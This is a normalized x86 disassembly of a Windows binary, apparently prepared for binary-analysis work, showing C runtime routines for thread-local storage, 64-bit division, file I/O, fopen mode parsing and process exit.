sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_100105c5
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_100105c5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000e859
push 0x1
push edi
call sub_100105e1
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100105c5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100105c5
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_100105e1
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_100105e1
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_100105e1
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_10009830
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_100105fd
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_1000e5f9
pop ecx
pop ecx
push eax
push edi
call sub_10009830
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_1000e5f9
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_1000a1bb
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_1000e5f9
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_1000a1c2
jmp r-xdata
push eax
call sub_1000e5f9
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_1000e592
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_1000a1bb
or [ ebp - 0x4 ] 0xffffffff
sub_1000e5f9
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1000e620
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1000a53d
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1000a53d
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1000e66c
push esi
call sub_1000b1d9
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_10010126
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000e6de
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_1000e6f1
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_10010126
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_1000b1a6
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000e6de
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000e758
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
pop esi
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
pop ecx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
pop ecx
mov eax [ esi + 0x50 ]
cmp eax rw-data
je r-xdata
push eax
call sub_10009e3d
pop ecx
push esi
call sub_10009e3d
pop ecx
push eax
call sub_10009e3d
pop ecx
sub_1000e7f8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_1000e6f1
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_1000e6f1
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_1000fbb9
push 0x16
call sub_100110da
pop ecx
pop ecx
push 0x3
call sub_1000f265
sub_1000e859
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_1000e7f8
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_1000e8b0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000e920
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000e995
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10010544
push esi
call sub_1000e9f2
push esi
mov edi eax
call sub_100105a3
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_1000e9f2
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_10010502
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_1000d515
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_10010502
push 0x1
mov edi eax
call sub_10010502
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_10010502
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10010483
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1000ea75
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10009e3d
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1000eaa0
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000eace
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_1001062c
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_1000eace
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_1000ebd7
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1000eb33
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_1000b26e
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_1000b2cf
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_1000da76
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000dac8
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_1000eaa0
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_1000eaa0
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_1000ebd7
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10010544
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000ec3c
push esi
mov edi eax
call sub_100105a3
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000ec3c
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_1000ee2c
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_1000d588
mov [ eax ] 0x1c
call sub_1000d591
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_1000d515
pop ecx
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
mov [ eax ] esi
jmp r-xdata
sub_1000edc7
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10010544
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000ee2c
push esi
mov edi eax
call sub_100105a3
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000ee2c
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_10010502
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1000d588
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_1000d515
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_1000ee9f
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_1000edc7
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_1000d588
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_1000edc7
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_1000edc7
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_1000f000
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_100106bf
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_1000f170
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_1000b26e
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_1000b2cf
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_100096ed
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_1000da76
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_1000dac8
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_1000f285
push edi
call sub_1000f32a
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_1000f33c
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_1000f333
pop edi
retn
push rw-data
push rw-data
call sub_1000f33c
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_1000f356
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_1000b26e
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
push esi
call sub_1000bd76
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call sub_1000cad1
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x20 ]
mov esi [ esi - 0x4 ]
sub esi 0x9
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi [ ebp - 0x20 ]
movzx esi [ eax ]
shl esi 0x4
mov [ ebp - 0x20 ] esi
jmp r-xdata
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000f3c0
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_1000f43b
cmp [ ebp - 0x28 ] 0x0
sub_1000f450
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1000f4d4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_100105fd
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_1000e7f8
pop esi
retn 0x4
sub_1000f538
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_100096ed
mov esi eax
pop ecx
test esi esi
